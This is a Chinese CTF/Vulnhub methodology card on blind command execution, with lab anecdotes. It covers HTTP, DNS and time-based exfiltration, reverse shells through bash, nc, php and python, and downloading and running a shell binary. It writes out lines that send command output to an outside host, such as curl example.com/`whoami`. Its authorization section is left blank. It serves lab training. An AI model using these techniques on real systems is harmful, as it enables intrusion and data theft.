# 命令执行外带与反弹 shell 落地

## R — 原文 (Reading)

> When the network is not working, you can run the data out through a time blind, borrowing mainly from the inertia of "&&" and "||"; the sleep function can be used under Linux, while some options are available under Windows.

> — 《Handbook for CTFers》Ch2 · 2.2.2.3 Execution Without Echoes

> 2.Linux反弹shell有多种姿势，bash、nc、php、Python等都需要尝试。

> — 《Vulnhub靶场实战指南》第十二节 BSides「突破点和坑」

> 1. 因为要执行的命令里面有空格、加号等符号，要将payload进行urlencode之后才可以正常执行。2. 因为生成的木马文件没有执行权限，下载到靶机后也无法执行，所以需要先给shell.elf 添加执行权限，之后再执行。

> — 《Vulnhub靶场实战指南》第八节 The Ether「注意」

> (3) 连接mysql执行命令，没有回显。菜刀超时，nc中只有exit退出时才回显，当时打算放弃了，才exit退出，结果退出才有回显，发现了milton账号的密码哈希。

> — 《Vulnhub靶场实战指南》第一节 Breach1.0「难点和踩到的坑」

## I — 方法论骨架 (Interpretation)

这张卡处理命令执行类漏洞在「命令已经能发出去，但拿不到可用结果」这一整段困境。它把四个单元按一条时间线排列：先区分「没执行」和「执行了但看不见」，再按网络条件选外带通道，拿到回显后把一次性命令执行换成可交互 shell，最后处理落地过程中的编码/权限/缓冲陷阱。核心纪律是：**先判现象属于哪一类，再换手段，不要在错误类别上反复试**。

**第一段：外带通道按可用性排序**。命令执行题的卡点常不是「能不能执行」而是「看不到结果」。通道按可用性排：能出网用 HTTP（`curl example.com/\`whoami\``、Windows 用 PowerShell Base64 + WebClient）或 DNS（`ping -c 1 \`whoami\`.example.com`，注意 Linux `-c` / Windows `-n` 差异，用 `ping -nc 1` 兼容）；完全不通网用时间盲（用结果位控制 `sleep` 或 `&&`/`||`）；有 Web 目录写权限则把结果重定向成文件再 GET 一次取回。选择依据是「网络是否可用 + 是否有可读回的 Web 路径」。还要区分「没执行」与「执行了但无回显」——用 `sleep 5` 看延迟或 VPS 日志先确认，否则会把通道选择建立在错误前提上。Windows 下照抄 Linux 的 `$(id)` 命令替换语法会失败，HTTP 通道遇特殊字符会截断（改用 PowerShell Base64）。

**第二段：反弹 shell 按 `bash → nc → php → python` 逐一尝试**。反弹失败往往不是思路错，而是目标环境缺少某个解释器/特性（`nc` 无 `-e`、bash 被限制）。不同 payload 依赖不同运行时，彼此互补；把四种当固定重试序列，能快速排除一类环境性失败，而不必先分析目标为什么不支持。打通后要立刻派生 tty（见提权卡），因为 `su`/`sudo` 会检查标准输入是否为终端。只试一种就停是明确失败模式——bulldog 节作者反思「只尝试了 bash 反弹」，其实还能 echo 文件赋 +x 执行、或用 Python。

**第三段：HTTP 投递命令必查 URL 编码与执行权限**。经 Web 参数传命令经过两层转换：HTTP 协议层里空格、`+`、`;` 会被解析或截断，必须 URL 编码后才能放进 Burp 请求；文件系统层里 `wget` 下载的文件默认无执行位，直接运行失败。这两个坑都发生在「思路正确但现象失败」的层面，属高耗时低价值陷阱，应作为固定检查项。仍无回显时查 Web 日志或响应码，区分是编码问题还是权限问题。

**第四段：`exit` 前无回显不要提前判负**。工具无回显不等于命令没执行。菜刀超时、nc 缓冲未刷新都会让输出延迟到会话结束才出现。Breach1.0 节作者「当时打算放弃了，才 exit 退出，结果退出才有回显」，拿到了 milton 账号密码哈希——这是后续提权的关键。判据是：遇到无回显先做一次会话收尾（`exit`/重连/换通道）再确认，而不是立刻换 payload 或放弃。这与第三段的编码/权限问题不同：那里是「没执行成功」，这里是「执行了但输出被缓冲」。

**四段关系**：第一段选外带通道解决「看见结果」，第二段把一次性执行换成持久 shell，第三、四段是落地过程中的两个固定检查项（编码/权限、缓冲）。所有段共享一个判停纪律：现象不改变时先换「观察方式」（收尾会话、换通道、看日志），再换「攻击方式」。

## A1 — 应用示例 (Application Example)

### 示例 1: 四种外带通道的兼容写法
- **类型与来源**: 【例题】《Handbook for CTFers》Ch2 2.2.2.3
- **问题/输入**: 已确认命令执行点，但页面不回显结果。
- **方法论的使用**: 先 `sleep 5` 看响应延迟确认命令执行；能出网用 `curl example.com/\`whoami\`` 或 `wget example.com/$(id|base64)`；仅 DNS 可用用 `ping -nc 1 test.example.com`（`-nc` 兼容 Linux/Windows 的计数参数差异）；无网络用 `&&`/`||` 控制 sleep 逐位读；有 Web 目录写权限时 `whoami>test` 再访问 `exec/test` 二次读取。
- **结论**: 通道按「网络可用性 + 是否有可读回 Web 路径」选择；特殊字符/空格用 Base64 编码规避截断。
- **结果**: 原书给出各通道写法与 Fig. 2.54~2.56，未给具体 flag。

### 示例 2: Acid 节 bash/nc 失败、php 成功
- **类型与来源**: 【亲历】《Vulnhub靶场实战指南》第四节 Acid / 第十二节 BSides
- **问题/输入**: 拿到命令执行点，但反弹 shell 连不上。
- **方法论的使用**: 先试 bash `/dev/tcp` 反弹，失败；试 nc（含 `mkfifo` 变种），失败；改试 php `-r fsockopen` 成功。The Ether 节则用 nc 下载 elf 后执行。打通后派生 tty（见 `lab-privesc`）。
- **结论**: 四种 payload 依赖不同运行时、彼此互补；只试一种就停是明确失败模式。
- **结果**: 原书记载 php 反弹成功，后续步骤见各节。

### 示例 3: The Ether 的 urlencode + chmod 三连
- **类型与来源**: 【亲历】《Vulnhub靶场实战指南》第八节 The Ether
- **问题/输入**: 通过 HTTP 参数投递 `system('wget...')` 类命令，命令含空格/加号，且下载的木马无法执行。
- **方法论的使用**: 先把 payload 做 urlencode 再放进 Burp 请求；下载 `shell.elf` 后先 `chmod +x` 再执行；仍无回显时检查 Web 日志/响应码区分编码问题还是权限问题。
- **结论**: URL 编码与执行权限是固定检查项，属「思路对但现象失败」的高耗时陷阱。
- **结果**: 原书记载三连 `system('wget...') / chmod +x / ./shell.elf` 成功落地。

### 示例 4: Breach1.0 的 exit 后才回显
- **类型与来源**: 【亲历】《Vulnhub靶场实战指南》第一节 Breach1.0
- **问题/输入**: 连 MySQL 执行命令无回显，菜刀超时，nc 里看不到输出。
- **方法论的使用**: 把「无回显」记为待验证而非失败；输入 `exit` 结束会话，观察缓冲区是否刷出历史输出；果然在退出时回显 milton 账号密码哈希，用于后续提权。
- **结论**: 工具无回显不等于命令没执行；先做会话收尾再确认，不要立刻换 payload。
- **结果**: 原书以「山重水复疑无路，柳暗花明又一村」记述，该哈希成为提权关键。

## A2 — 触发场景 (Future Trigger) ★

### 用户会在什么情境下需要它
1. 命令执行 payload 发出去了，但页面完全不显示结果。
2. 目标似乎不能出网，不知道还能怎么把数据带出来。
3. 反弹 shell 一种姿势连不上，不知道换什么。
4. wget 下来的木马运行报 "Permission denied"，或 payload 在 Burp 里被截断。
5. 菜刀/nc 里看不到命令输出，怀疑要放弃。
6. Windows 目标上照抄 Linux 的 curl 命令替换写法失败。

### 语言信号（出现这些就该激活）
- 中文：「命令执行没回显」「exec 不输出结果怎么办」「blind command injection」「反弹 shell 连不上」「bash 反弹失败」「靶机没有 nc 怎么办」「wget 下来运行不了」「Permission denied」「payload not executing via burp」「菜刀超时」「nc 看不到输出」
- English: "no output from RCE", "reverse shell not connecting", "reverse shell one-liner alternatives", "payload not executing via burp", "no output from command", "blind command injection egress"

### 与相邻能力的区分
- 与 `web-vuln-channel-selection` 的区别：SSRF 借服务器访问内网但不依赖 shell；本卡从「已有命令执行点」开始。
- 与 `file-read-and-include` 的区别：那张卡负责把包含/上传变成命令执行，本卡负责命令执行之后的落地与回显。
- 与 `lab-privesc` 的区别：本卡停在低权限 shell（含 tty 派生前的交接），提权路线由那张卡负责。
- 与 `awd-attack-defense` 的区别：AWD 的 exp 终点是非交互打印 flag，本卡追求可交互 shell；AWD 轮换节奏下慢速反弹未必适用。

## E — 可执行步骤 (Execution)

**必需输入**: 一个已确认可触发的命令执行/代码执行点；对目标出网策略与系统类型的初步判断；攻击机监听地址；自建 VTest 平台便于测试（Handbook 建议）。若未确认命令是否真的执行，先做第 1 步。
**交付物与完成标准**: 一份「外带/落地报告」：写明确认执行的证据、选中的外带通道、反弹 shell 的成功姿势、编码与权限检查记录，以及一个可稳定执行 `id` 的 shell。判据是能拿到命令输出或交互式 shell。

1. **先确认执行，再分「没执行」与「无回显」**
   - 做什么：发 `sleep 5` 看响应延迟，或 `curl` 看 VPS 日志；有延迟/日志即命令已执行。
   - 完成标准：明确属于「没执行」还是「执行了但看不见」。
   - 判停：属于「没执行」时回到 `web-vuln-channel-selection` 检查注入通道；属于「无回显」才进入第 2 步。

2. **选外带通道**
   - 做什么：能出网用 HTTP（`curl example.com/\`whoami\``，Windows 用 PowerShell Base64 + WebClient）或 DNS（`ping -nc 1 \`whoami\`.example.com`）；无网络用时间盲（`&&`/`||` + sleep）；有 Web 目录写权限则重定向结果再 GET。
   - 完成标准：VPS/DNS 日志收到带结果的请求，或按延时逐位读出结果。
   - 判停：网络不通时不要死磕 HTTP，切时间盲；Windows 不要照抄 Linux `$(id)` 语法，特殊字符用 Base64。

3. **反弹 shell 姿势重试**
   - 做什么：bash `/dev/tcp` → nc（含 `mkfifo` 变种）→ php `-r fsockopen` → python socket，逐一尝试，观察监听端是否有连接。
   - 完成标准：拿到一个可稳定执行命令的 shell。
   - 判停：全部失败时检查目标是否有对应解释器/特性（nc 无 `-e`、bash 被限制）；打通后转 `lab-privesc` 派生 tty。

4. **HTTP 投递的编码与权限检查**
   - 做什么：命令含空格/加号/分号先 urlencode 再放进 Burp；需落地二进制时下载后先 `chmod +x` 再执行；无回显时查 Web 日志或响应码。
   - 完成标准：命令按预期执行，无截断、无 "Permission denied"。
   - 判停：`+` 被当空格或命令截断 → 回本步重做编码；权限拒绝 → 先 chmod，不判定木马失效。

5. **无回显先做会话收尾**
   - 做什么：把无回显记为「待验证」；输入 `exit` 结束会话或重连，观察缓冲是否刷出历史输出；仍无输出则换通道（菜刀→nc，或写文件再读）。
   - 完成标准：确认拿到输出或确认命令真的没执行。
   - 判停：不要一遇无回显就换 payload 或放弃；Breach1.0 节的 milton 哈希就是在 exit 后才出现的。

## B — 边界 (Boundary) ★

### 不要用的情况
- 目标没有任何出网能力、也没有可写可读的 Web 路径、且命令执行是「一次性无会话」：时间盲逐位读成本极高，需重新评估是否值得。
- 已确认命令根本没执行：本卡所有通道都无效，先回注入通道排查。
- 目标是 AWD 场景需要非交互批量打全场：可交互 shell 不适用，按 `awd-attack-defense` 写读文件式 exp。
- 需要的是提权而非回显：本卡停在低权限 shell，转 `lab-privesc`。

### 已知失败模式
- Windows 下照抄 Linux 的 `curl ... $(id)`，缺少命令替换语法而失败（Ch2 2.2.2.3）。
- HTTP 通道遇特殊字符或空格截断，作者改用 PowerShell Base64（Ch2）。
- 网络不通时死磕 HTTP 通道，应切时间盲（Ch2）。
- 只试 bash 反弹就停，没试 nc/php/python（Vulnhub bulldog 节作者自承）。
- 不做 urlencode 导致 `+` 被当空格、命令截断（Vulnhub The Ether）。
- 下载文件不 chmod 导致 "Permission denied"，误判木马失效（Vulnhub The Ether）。
- 把无回显当失败并放弃，错过 exit 后才刷出的密码哈希（Vulnhub Breach1.0）。

### 作者与时代的局限
- 外带示例基于当时的 VPS/平台（VTest）与工具（菜刀）；现代环境多用专门的 OOB 平台（Burp Collaborator、interactsh），需按实际替换。
- 反弹 shell 写法针对旧版 bash/nc/php；现代发行版默认 nc 无 `-e`、PHP 禁用 `fsockopen` 的情况更常见。
- `ping -nc 1` 的兼容性写法依赖具体 ping 实现，不是所有系统都支持。
- Breach1.0 的缓冲行为来自特定工具链，现代终端/平台未必重现。
- 本卡不涉及免杀：反弹载荷被 EDR/杀软拦截的情况本书未覆盖。

### 容易混淆的方法
- **「没执行」vs「执行了但无回显」**：前者通道选择无意义，先回注入排查；后者才选 HTTP/DNS/时间/写文件。
- **时间盲（命令执行）vs SQL 时间盲**：这里延时来自系统命令 `sleep`/`ping`，不是数据库函数。
- **编码/权限问题 vs 缓冲问题**：前者命令没真正跑起来（本卡第 4 步），后者跑了但输出延迟（第 5 步）。
- **反弹 shell 换姿势 vs 已选 payload 的传输细节**：换姿势是换运行时依赖，传输细节是编码与权限；两者是不同步骤。

### 授权与合规边界
> 待补充（用户自行填写）
